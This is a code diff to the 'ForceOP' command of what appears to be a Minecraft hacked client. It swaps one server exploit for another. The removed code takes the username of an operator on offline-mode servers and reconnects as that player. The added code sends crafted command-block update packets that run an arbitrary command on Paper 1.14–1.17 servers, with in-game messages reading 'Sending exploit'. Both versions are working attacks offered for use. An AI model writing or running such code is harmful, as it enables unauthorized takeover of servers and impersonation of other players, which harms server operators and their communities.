@@ -4,62 +4,54 @@
 
 package net.shadow.client.feature.command.impl;
 
-import net.minecraft.client.network.PlayerListEntry;
-import net.minecraft.client.network.ServerAddress;
-import net.minecraft.world.GameMode;
+import net.minecraft.block.Block;
+import net.minecraft.block.BlockState;
+import net.minecraft.block.Blocks;
+import net.minecraft.block.entity.CommandBlockBlockEntity;
+import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
+import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
+import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
+import net.minecraft.util.hit.BlockHitResult;
+import net.minecraft.util.hit.EntityHitResult;
+import net.minecraft.util.hit.HitResult;
+import net.minecraft.util.math.BlockPos;
 import net.shadow.client.ShadowMain;
 import net.shadow.client.feature.command.Command;
 import net.shadow.client.feature.command.exception.CommandException;
-import net.shadow.client.helper.Globals;
-import net.shadow.client.mixin.SessionAccessor;
-
-import java.net.InetSocketAddress;
-import java.util.Objects;
 
 public class ForceOP extends Command {
     public ForceOP() {
-        super("ForceOP", "Get op on cracked servers", "forceOp", "crackedOp");
-    }
-
-    private static void authUsername(String username) {
-        ShadowMain.client.getSessionProperties().clear();
-        ((SessionAccessor) ShadowMain.client).setUsername(username);
-    }
-
-    private String getPlayer() {
-        for (PlayerListEntry player : ShadowMain.client.getNetworkHandler().getPlayerList()) {
-            if (player.getGameMode().equals(GameMode.CREATIVE) || player.getGameMode().equals(GameMode.SPECTATOR)) {
-                return player.getProfile().getName();
-            }
-        }
-        return "None";
-    }
-
-    @Override
-    public String[] getSuggestions(String fullCommand, String[] args) {
-        if (args.length == 1) {
-            return Objects.requireNonNull(ShadowMain.client.world).getPlayers().stream().map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName()).toList().toArray(String[]::new);
-        }
-        return super.getSuggestions(fullCommand, args);
+        super("ForceOP", "Edit command blocks on paper 1.14 - 1.17", "forceop", "editcmd");
     }
 
     @Override
     public void onExecute(String[] args) throws CommandException {
         validateArgumentsLength(args, 1);
-        InetSocketAddress socket = (InetSocketAddress) ShadowMain.client.player.networkHandler.getConnection().getAddress();
-        Globals.serverAddress = new ServerAddress(socket.getHostName(), socket.getPort());
-        String nick;
-        if (args.length == 0) {
-            nick = getPlayer();
-            if (nick.equals("None")) {
-                error("Could not find a suitable OP Player, use arguments to define");
-                return;
+        HitResult view = ShadowMain.client.crosshairTarget;
+        String command = String.join(" ",args);
+        if (view == null || view.getType() == HitResult.Type.MISS) {
+            error("Look at a command block or command block minecart");
+        } else if (view instanceof EntityHitResult ehr) {
+            if (ehr.getEntity() instanceof CommandBlockMinecartEntity) {
+                message("Sending exploit");
+                ShadowMain.client.player.networkHandler.sendPacket(new UpdateCommandBlockMinecartC2SPacket(ehr.getEntity().getId(), command, false));
+                success("Sent exploit, try to activate the command block minecart");
+            } else {
+                error("Look at a command block minecart");
             }
-        } else {
-            nick = args[0];
+        } else if (view instanceof BlockHitResult bhr) {
+            BlockPos bp = bhr.getBlockPos();
+            BlockState bs = ShadowMain.client.world.getBlockState(bp);
+            Block b = bs.getBlock();
+            if (b == Blocks.COMMAND_BLOCK || b == Blocks.REPEATING_COMMAND_BLOCK || b == Blocks.CHAIN_COMMAND_BLOCK) {
+                message("Sending exploit");
+                ShadowMain.client.getNetworkHandler().sendPacket(new UpdateCommandBlockC2SPacket(bp, "", CommandBlockBlockEntity.Type.REDSTONE, false, false, false));
+                ShadowMain.client.getNetworkHandler().sendPacket(new UpdateCommandBlockC2SPacket(bp, command, CommandBlockBlockEntity.Type.REDSTONE, false, false, true));
+                success("Sent exploit, command block should self activate");
+            } else {
+                error("Look at any type of command block");
+            }
         }
-        authUsername(nick);
-        Globals.reconnectInstantly = true;
-        ShadowMain.client.world.disconnect();
+
     }
 }
